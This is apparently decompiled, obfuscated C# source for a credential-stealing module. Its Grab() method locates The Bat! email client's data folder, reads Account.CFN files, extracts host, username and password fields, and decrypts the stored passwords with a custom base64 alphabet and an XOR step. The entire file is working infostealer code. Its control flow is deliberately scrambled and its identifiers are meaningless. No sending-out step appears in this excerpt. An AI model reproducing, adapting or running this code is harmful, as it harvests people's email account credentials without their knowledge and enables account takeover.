using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using p3N5Y;
using q9Ep;

namespace ZAZUx;

public class GekhRRL6hE9 : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string bhvLEO
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public GekhRRL6hE9()
	{
		bhvLEO = "The Bat!";
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		string path = default;
		do
		{
			switch (num)
			{
			case 4:
				return list;
			case 2:
				path = Environment.GetEnvironmentVariable("appdata") + "\\The Bat!";
				num = 3;
				break;
			}
			if (num == 3)
			{
				if (Directory.Exists(path))
				{
					break;
				}
				num = 4;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 5);
		string[] directories = Directory.GetDirectories(path);
		for (int i = 0; i <= directories.Length - 1; i++)
		{
			if (!File.Exists(directories[i] + "\\Account.CFN"))
			{
				continue;
			}
			string[] array = File.ReadAllLines(directories[i] + "\\Account.CFN");
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (!text.Contains("zzz"))
				{
					continue;
				}
				try
				{
					char[] value = new char[3];
					string[] array3 = text.gy6HND7Xm(new string(value));
					string obj = array3[2];
					char[] separator = new char[1];
					string text2 = obj.Split(separator)[0];
					string obj2 = array3[2];
					char[] separator2 = new char[1];
					string text3 = obj2.Split(separator2)[1];
					string obj3 = array3[0];
					char[] trimChars = new char[1];
					string host = obj3.Trim(trimChars);
					string[] array4 = array3[0].gy6HND7Xm("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
					if (array4.Length > 1)
					{
						host = array4[1];
					}
					if ((text2.Length > 0) & (text3.Length > 0))
					{
						list.Add(new ii68
						{
							byIdLuuGZbL = host,
							S8v = n3X6(text3),
							_9H5rP7hg2 = n3X6(text2),
							oVAe = bhvLEO
						});
					}
				}
				catch
				{
				}
			}
		}
		return list;
	}

	private static string n3X6(string TIfI)
	{
		int num = 0;
		int num2 = default;
		int num3 = default;
		int num4 = default;
		int num5 = default;
		string text = default;
		byte[] array = default;
		int num6 = default;
		while (true)
		{
			if (num == 3)
			{
				goto IL_001f;
			}
			if (num == 1)
			{
				if (TIfI.Length % 4 == 0)
				{
					goto IL_001f;
				}
				num = 2;
			}
			switch (num)
			{
			case 2:
				return "";
			case 0:
				num = 1;
				break;
			}
			if (num == 4)
			{
				goto IL_0135;
			}
			continue;
			IL_01e2:
			if (num2 >= TIfI.Length)
			{
				break;
			}
			num3 = 0;
			num4 = 0;
			goto IL_0156;
			IL_0135:
			num3 = (num3 << 6) + num5;
			num4++;
			goto IL_0156;
			IL_0156:
			if (num4 <= 3)
			{
				char value = TIfI[num2];
				num2++;
				num5 = text.IndexOf(value);
				if (num5 < 0)
				{
					return "";
				}
				goto IL_0135;
			}
			array[num6] = Convert.ToByte((num3 >> 16) & 0xFF);
			num6++;
			array[num6] = Convert.ToByte((num3 >> 8) & 0xFF);
			num6++;
			array[num6] = Convert.ToByte(num3 & 0xFF);
			num6++;
			goto IL_01e2;
			IL_001f:
			text = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			array = new byte[1024];
			num6 = 0;
			num2 = 0;
			goto IL_01e2;
		}
		byte[] array2 = F1XlY(array);
		string text2 = "";
		int num7 = array2.Length;
		while (num7 > 4)
		{
			num7--;
			text2 += (char)(array2[num7] ^ 0x5A);
		}
		return text2;
	}

	private static byte[] F1XlY(byte[] sWnks)
	{
		int num = 0;
		int num2 = default;
		int num3 = default;
		byte[] array = default;
		while (true)
		{
			if (num == 1)
			{
				if (sWnks.Length <= 1)
				{
					break;
				}
				num = 2;
			}
			if (num == 3)
			{
				goto IL_0094;
			}
			if (num == 9)
			{
				goto IL_0068;
			}
			goto IL_0083;
			IL_01bb:
			if (num == 8)
			{
				goto IL_01a5;
			}
			if (num == 0)
			{
				num = 1;
			}
			if (num == 13)
			{
				break;
			}
			continue;
			IL_00e9:
			num2--;
			num = 5;
			goto IL_0100;
			IL_01a5:
			if (num3 <= num2)
			{
				goto IL_0068;
			}
			num = 12;
			goto IL_01bb;
			IL_0100:
			if (num == 7)
			{
				num3 = 0;
				num = 8;
			}
			if (num == 2)
			{
				num2 = sWnks.Length - 1;
				num = 3;
			}
			switch (num)
			{
			case 12:
				return array;
			case 10:
				num3++;
				num = 11;
				break;
			}
			if (num == 11)
			{
				goto IL_01a5;
			}
			goto IL_01bb;
			IL_0083:
			if (num == 5)
			{
				goto IL_0094;
			}
			goto IL_00ab;
			IL_0094:
			if (sWnks[num2] != 0)
			{
				num = 6;
				goto IL_00ab;
			}
			goto IL_00e9;
			IL_0068:
			array[num3] = sWnks[num3];
			num = 10;
			goto IL_0083;
			IL_00ab:
			if (num == 6)
			{
				array = new byte[num2 + 1];
				num = 7;
			}
			if (num == 4)
			{
				goto IL_00e9;
			}
			goto IL_0100;
		}
		return new byte[0];
	}
}
